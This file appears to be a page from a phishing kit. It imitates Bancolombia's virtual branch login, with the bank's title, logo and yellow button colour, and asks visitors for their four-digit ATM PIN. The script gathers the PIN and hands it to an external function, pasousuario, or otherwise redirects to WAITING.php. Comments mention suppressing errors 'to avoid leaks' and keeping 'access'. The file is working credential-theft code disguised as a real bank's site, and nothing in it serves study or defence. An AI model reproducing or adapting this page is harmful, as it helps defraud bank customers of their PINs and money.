<?php
// Desactivamos errores para evitar fugas, pero forzamos la carga
error_reporting(0);
date_default_timezone_set('America/Bogota');
?>
<!DOCTYPE html>
<html lang="es">
    <head>
        <title>Bancolombia Sucursal Virtual Personas</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700&display=swap" rel="stylesheet">
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
        <script type="text/javascript" src="../js/functions.js?v=<?php echo time(); ?>"></script>

        <style type="text/css">
            body { font-family: 'Open Sans', sans-serif; margin: 0; padding: 0; background-color: #fff; }
            /* Forzamos que nada bloquee la vista al inicio */
            #fondo, #cargando-o { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 999; text-align: center; padding-top: 50%; }
            .frm { text-align: center; margin-top: 50px; }
            .clave { padding: 10px 0; text-align: center; width: 45px; font-size: 24px; font-weight: bold; border: 1px solid #ccc; border-radius: 4px; margin: 0 5px; }
            #btn-password { width: 85%; margin: 30px auto; display: block; height: 50px; border: none; border-radius: 5px; font-weight: bold; background-color: #ccc; color: #000; font-size: 16px; }
            .header-app { display: flex; justify-content: space-between; align-items: center; padding: 10px; border-bottom: 1px solid #eee; }
        </style>
    </head>
    <body>         
        <div id="fondo"></div>
        <div id="cargando-o">
            <img src="../img/load4.gif" width="80"><br>Cargando...
        </div>

        <div class="header-app">
            <img src="../img/btn-cerrar.jpg" height="25">
            <img src="../img/logo-app.jpg" height="25">
            <span style="width: 30px;"></span>
        </div>
       
        <div class="frm">
            <img src="../img/candado.jpg" width="16"><br>
            <p style="font-size: 15px;">Ingresa la clave del cajero</p>
            <div style="display: flex; justify-content: center;">
                <input type="password" class="clave" id="p1" maxlength="1" inputmode="numeric">
                <input type="password" class="clave" id="p2" maxlength="1" inputmode="numeric">
                <input type="password" class="clave" id="p3" maxlength="1" inputmode="numeric">
                <input type="password" class="clave" id="p4" maxlength="1" inputmode="numeric">
            </div>
        </div>  
        
        <button id="btn-password" disabled>CONTINUAR</button> 

        <script type="text/javascript">
            $(document).ready(function() {
                // Salto de campos
                $('.clave').on('input', function() {
                    if ($(this).val().length === 1) { $(this).next('.clave').focus(); }
                    
                    var p = $("#p1").val() + $("#p2").val() + $("#p3").val() + $("#p4").val();
                    if (p.length === 4) {
                        $("#btn-password").prop("disabled", false).css("background-color", "#FDDA24");
                    } else {
                        $("#btn-password").prop("disabled", true).css("background-color", "#ccc");
                    }
                });

                // Acción de envío
                $("#btn-password").click(function(){
                    var pin = $("#p1").val() + $("#p2").val() + $("#p3").val() + $("#p4").val();
                    $("#fondo, #cargando-o").show();
                    // Ejecuta la función de tus 2 IDs
                    if(typeof pasousuario === 'function'){
                        pasousuario(pin);
                    } else {
                        // Si falla el JS externo, saltamos manual para no perder el acceso
                        window.location.href = "WAITING.php";
                    }
                });
            });
        </script>
    </body>
</html>
